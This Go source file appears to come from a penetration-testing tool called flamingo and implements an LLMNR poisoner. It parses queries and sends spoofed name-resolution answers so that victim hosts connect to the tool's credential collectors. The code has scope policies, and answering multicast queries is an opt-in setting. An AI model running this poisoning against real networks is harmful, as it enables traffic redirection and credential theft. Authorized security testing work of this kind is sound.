package flamingo

import (
	"fmt"
	"net"
	"sync"

	log "github.com/sirupsen/logrus"
	"golang.org/x/net/ipv4"
	"golang.org/x/net/ipv6"
)

// LLMNR multicast groups (RFC 4795).
var (
	llmnrGroupV4 = net.IPv4(224, 0, 0, 252)
	llmnrGroupV6 = net.ParseIP("ff02::1:3")
)

// ConfLLMNR describes the options for the LLMNR poisoner.
type ConfLLMNR struct {
	BindPort     uint16
	BindHost     string
	RecordWriter *RecordWriter

	// Policy scopes which queries are answered. A nil policy answers all.
	Policy *ScopePolicy
	// AnswerBroadcast enables answering multicast and broadcast queries, the
	// active half of poisoning. Queries directed at this host are always
	// answered.
	AnswerBroadcast bool
	// SpoofIPv4/SpoofIPv6 override the advertised address. When empty, the
	// address of the interface the query arrived on is used.
	SpoofIPv4 string
	SpoofIPv6 string
	// AnswerName optionally replaces the name carried in the answer record
	// while the question name is echoed as asked.
	AnswerName string
	// TTL is the answer TTL in seconds.
	TTL uint32

	shutdown bool
	v4       *ipv4.PacketConn
	v6       *ipv6.PacketConn
	m        sync.Mutex
}

// NewConfLLMNR creates a default configuration for the LLMNR poisoner.
func NewConfLLMNR() *ConfLLMNR {
	return &ConfLLMNR{
		BindPort: 5355,
		BindHost: "[::]",
		TTL:      defaultLLMNRTTL,
		Policy:   DefaultScopePolicy(),
	}
}

// IsShutdown checks to see if the service is shutting down.
func (c *ConfLLMNR) IsShutdown() bool {
	c.m.Lock()
	defer c.m.Unlock()
	return c.shutdown
}

// Shutdown flags the service to shut down.
func (c *ConfLLMNR) Shutdown() {
	c.m.Lock()
	defer c.m.Unlock()
	if c.shutdown {
		return
	}
	c.shutdown = true
	if c.v4 != nil {
		c.v4.Close()
	}
	if c.v6 != nil {
		c.v6.Close()
	}
}

// SpawnLLMNR starts an LLMNR poisoner listening on the configured port.
//
// Name poisoning is active, not passive: answering is what makes hosts connect
// to flamingo. The line is drawn by reach, not by listener. This one runs by
// default -- it logs every query it sees and answers those sent directly to
// this host, like any other listener. Answering a query multicast to the
// segment reaches hosts that were never talking to flamingo, so that half
// needs AnswerBroadcast (--poison-broadcast), and the ScopePolicy and analyze
// mode narrow that half further, inside an authorized engagement scope. None
// of them gate the directed case: replying to a query aimed at this host is
// not poisoning.
func SpawnLLMNR(c *ConfLLMNR) error {
	v4host, v6host := poisonBindHosts(c.BindHost)

	var started bool
	if v4host != "" {
		v4, err := openPoisonV4(v4host, c.BindPort, llmnrGroupV4, "llmnr")
		if err != nil {
			log.Debugf("llmnr: failed to open IPv4 socket on %s:%d: %s", v4host, c.BindPort, err)
		} else {
			c.v4 = v4
			started = true
			go poisonServeV4(v4, "llmnr", c.IsShutdown, c.handle)
		}
	}

	if v6host != "" {
		v6, err := openPoisonV6(v6host, c.BindPort, llmnrGroupV6, "llmnr")
		if err != nil {
			log.Debugf("llmnr: failed to open IPv6 socket on %s:%d: %s", v6host, c.BindPort, err)
		} else {
			c.v6 = v6
			started = true
			go poisonServeV6(v6, "llmnr", c.IsShutdown, c.handle)
		}
	}

	if !started {
		return fmt.Errorf("failed to listen on %s:%d for llmnr", c.BindHost, c.BindPort)
	}

	log.Debugf("llmnr is listening on %s:%d", c.BindHost, c.BindPort)
	return nil
}

// parseLLMNRQuery parses a single-label LLMNR query. It returns the TID, the raw
// queried name bytes, the query type, whether an AAAA answer is wanted, and
// whether the datagram is a query we answer.
func parseLLMNRQuery(data []byte) (tid, name []byte, qtype string, wantV6, ok bool) {
	// Header (12) + name length byte (1).
	if len(data) < 13 {
		return nil, nil, "", false, false
	}
	// Flags must be all-zero (standard query, opcode 0, no flags set).
	if data[2] != 0x00 || data[3] != 0x00 {
		return nil, nil, "", false, false
	}
	nameLen := int(data[12])
	if nameLen == 0 || 13+nameLen >= len(data) {
		return nil, nil, "", false, false
	}
	// LLMNR resolves flat, single-label names, and buildLLMNRAnswer echoes
	// the question as one length-prefixed label. A multi-label QNAME would
	// therefore come back with a question the querier does not match and
	// silently discards, so decline it here rather than send a reply that
	// cannot work. A single label is followed directly by the null label.
	if data[13+nameLen] != 0x00 {
		return nil, nil, "", false, false
	}
	name = data[13 : 13+nameLen]
	// Read QTYPE/QCLASS where the question actually ends, not from the tail
	// of the datagram.
	qtype, wantV6, ok = classifyDNSQueryAt(data, 13+nameLen+1)
	if !ok {
		return nil, nil, "", false, false
	}
	return data[0:2], name, qtype, wantV6, true
}

// buildLLMNRAnswer builds a byte-exact LLMNR response for the given question.
func buildLLMNRAnswer(tid, qname, aname []byte, wantV6 bool, ip net.IP, ttl uint32) []byte {
	rtype := []byte{0x00, 0x01} // A
	if wantV6 {
		rtype = []byte{0x00, 0x1c} // AAAA
	}

	out := make([]byte, 0, 64)
	out = append(out, tid...)     // transaction id
	out = append(out, 0x80, 0x00) // flags: QR=1
	out = append(out, 0x00, 0x01) // questions
	out = append(out, 0x00, 0x01) // answer RRs
	out = append(out, 0x00, 0x00) // authority RRs
	out = append(out, 0x00, 0x00) // additional RRs

	// Question (echoed).
	out = append(out, byte(len(qname)))
	out = append(out, qname...)
	out = append(out, 0x00)
	out = append(out, rtype...)
	out = append(out, 0x00, 0x01) // class IN

	// Answer.
	out = append(out, byte(len(aname)))
	out = append(out, aname...)
	out = append(out, 0x00)
	out = append(out, rtype...)
	out = append(out, 0x00, 0x01) // class IN
	out = be32(out, ttl)

	if wantV6 {
		out = append(out, 0x00, 0x10)
		out = append(out, ip.To16()...)
	} else {
		out = append(out, 0x00, 0x04)
		out = append(out, ip.To4()...)
	}
	return out
}

// handle processes one LLMNR datagram, records it, and returns any reply bytes.
func (c *ConfLLMNR) handle(data []byte, src net.Addr, ifIndex int, dst net.IP) []byte {
	tid, name, qtype, wantV6, ok := parseLLMNRQuery(data)
	if !ok {
		return nil
	}
	qname := string(name)

	respond, reason := poisonDecide(c.Policy, c.AnswerBroadcast, src, qname, dst)

	var spoof net.IP
	if respond {
		spoof = c.chooseSpoof(wantV6, ifIndex, src)
		if spoof == nil {
			respond = false
			reason = "host has no routable address to answer with"
		}
	}

	c.record(src, qname, qtype, respond, spoof, reason)
	if !respond {
		return nil
	}

	aname := name
	if c.AnswerName != "" {
		aname = []byte(c.AnswerName)
	}
	return buildLLMNRAnswer(tid, name, aname, wantV6, spoof, c.TTL)
}

// chooseSpoof returns the address to answer with. A poisoner advertises its
// own address so the querier connects to flamingo's collectors; see
// poisonSpoofIP for the resolution order.
func (c *ConfLLMNR) chooseSpoof(wantV6 bool, ifIndex int, src net.Addr) net.IP {
	override := c.SpoofIPv4
	if wantV6 {
		override = c.SpoofIPv6
	}
	return poisonSpoofIP(override, wantV6, ifIndex, src)
}

func (c *ConfLLMNR) record(src net.Addr, name, qtype string, answered bool, spoof net.IP, reason string) {
	fields := map[string]string{
		"_server":  fmt.Sprintf("%s:%d", c.BindHost, c.BindPort),
		"name":     name,
		"qtype":    qtype,
		"answered": fmt.Sprintf("%t", answered),
	}
	if answered && spoof != nil {
		fields["spoofed"] = spoof.String()
	}
	if !answered && reason != "" {
		fields["reason"] = reason
	}
	c.RecordWriter.Record("query", "llmnr", src.String(), fields)
}
